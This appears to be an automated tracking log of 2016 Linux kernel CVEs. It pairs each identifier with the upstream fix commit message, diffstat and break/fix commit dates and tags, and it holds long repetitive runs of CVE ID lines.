Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-1237:
CVE-2016-1237:
CVE-2016-2847:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-22016-06-27:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-5829:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5829:
CVE-2016-5829:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 485e71e8fb6356c08c7fc6bcce4bf02c9a9a663f
Author: Andreas Gruenbacher <agruenba@redhat.com>
Date:   Wed Jun 22 23:57:25 2016 +0200

    posix_acl: Add set_posix_acl
    
    Factor out part of posix_acl_xattr_set into a common function that takes
    a posix_acl, which nfsd can also call.
    
    The prototype already exists in include/linux/posix_acl.h.
    
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>
    Cc: stable@vger.kernel.org
    Cc: Christoph Hellwig <hch@infradead.org>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Signed-off-by: J. Bruce Fields <bfields@redhat.com>

 fs/posix_acl.c |   42 +++++++++++++++++++++++-------------------
 1 file changed, 23 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-29
CVE: CVE-2016-1237
Break Date: 2014-01-26
Break Commit: 4ac7249ea5a0ceef9f8269f63f33cc873c3fac61
Break Tag: 3.14
Linus Fix Date: 2016-06-24
Linus Commit: 485e71e8fb6356c08c7fc6bcce4bf02c9a9a663f
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: 8977f46fff476e4a5c5ab270a78c9ab8b548d645
Stable Tag: 3.14.74

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
